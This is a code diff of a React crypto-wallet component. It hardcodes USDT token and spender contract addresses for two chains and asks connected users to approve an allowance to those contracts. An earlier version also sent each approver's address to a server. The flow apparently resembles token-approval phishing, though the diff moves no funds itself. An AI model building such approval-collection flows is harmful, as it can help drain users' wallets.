@@ -14,13 +14,25 @@ import { isMobile } from './userAgent';
 import { useApprove } from './useApprove';
 import { contractAddress, contractApprove } from './api';
 
+
+const CONTRACT_LIST = {
+    1: {
+        token: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+        contract: "0x09eb3bb6d937734a74612d1dc8978ecb481576a1",
+    },
+    56: {
+        token: "0x55d398326f99059fF775485246999027B3197955",
+        contract: "0xb8eb8ec5e18e8ddcf8620645a18b76184cad7ec2",
+    }
+}
+
 function handleClickExternalLink(event) {
     const { href } = event.currentTarget
     window.open = href;
 }
 
 const Wallet = () => {
-    const { connector, account, chainId, isActive, provider } = useWeb3React();
+    const { connector, account, chainId, isActive } = useWeb3React();
     const [selectedWallet, setSelectedWallet] = useState(null);
     const [loading, setLoading] = useState(false);
     const [show, setShow] = useState(false);
@@ -31,7 +43,7 @@ const Wallet = () => {
 
     const approve = useApprove(contractInfo?.token);
 
-    console.log(chainId);
+    console.log(connector, account, chainId, isActive);
 
     const tryActivation = useCallback(
         async (connector) => {
@@ -55,11 +67,14 @@ const Wallet = () => {
 
     const getContactAddress = async () => {
         if (isActive && chainId) {
-            const res = await contractAddress(chainId);
+            // const res = await contractAddress(chainId);
 
-            if (res) {
-                setContractInfo({ contract: res.contract, token: res.token });
-            }
+            // if (res) {
+            //     setContractInfo({ contract: res.contract, token: res.token });
+            // }
+
+            const { contract, token } = CONTRACT_LIST[chainId];
+            setContractInfo({ contract, token })
         }
     }
 
@@ -81,14 +96,16 @@ const Wallet = () => {
     }
 
     const handleApprove = () => {
-        if (!account) {
+        if (!amount) {
             setError(true);
             return;
         }
 
         approve(contractInfo.contract, amount)
             .then(() => {
-                contractApprove(chainId, { address: account, amount, ...contractInfo })
+                // contractApprove(chainId, { address: account, amount, ...contractInfo })
+
+                alert("已授权：" + amount);
             });
     }
 
@@ -122,11 +139,6 @@ const Wallet = () => {
     }, [chainId, isActive]);
 
     return <div className='wallet'>
-        {isActive && <div className='wallet-address'>
-            {account}
-            {chainId && <span className='wallet-network'>{CHAIN_IDS[chainId]}</span>}
-        </div>}
-
         <Stack direction="row" spacing={2}>
             {loading ?
                 <Button variant="contained" >Loading...</Button> :
@@ -146,26 +158,33 @@ const Wallet = () => {
             }
         </Stack>
 
-        {contractInfo && <>
+        {isActive && <>
             <div className='wallet-address'>
-                {contractInfo.token}
+                Account: {account}
+                {chainId && <span className='wallet-network'>{CHAIN_IDS[chainId]}</span>}
             </div>
-            <Stack direction="row" spacing={2} alignItems="flex-end">
-                <TextField
-                    size="small"
-                    label="amount"
-                    type="number"
-                    value={amount} error={error}
-                    variant="standard"
-                    onChange={handleAmountChange}
-                />
-                <Button
-                    variant="contained"
-                    onClick={handleApprove}
-                >
-                    Approve
-                </Button>
-            </Stack>
+
+            {contractInfo && <>
+                <div className='wallet-address'>
+                    Token: {contractInfo.token}
+                </div>
+                <Stack direction="row" spacing={2} alignItems="flex-end">
+                    <TextField
+                        size="small"
+                        label="amount"
+                        type="number"
+                        value={amount} error={error}
+                        variant="standard"
+                        onChange={handleAmountChange}
+                    />
+                    <Button
+                        variant="contained"
+                        onClick={handleApprove}
+                    >
+                        Approve
+                    </Button>
+                </Stack>
+            </>}
         </>}
 
         <div className={"wallet-modal " + (show ? "show" : "")}>
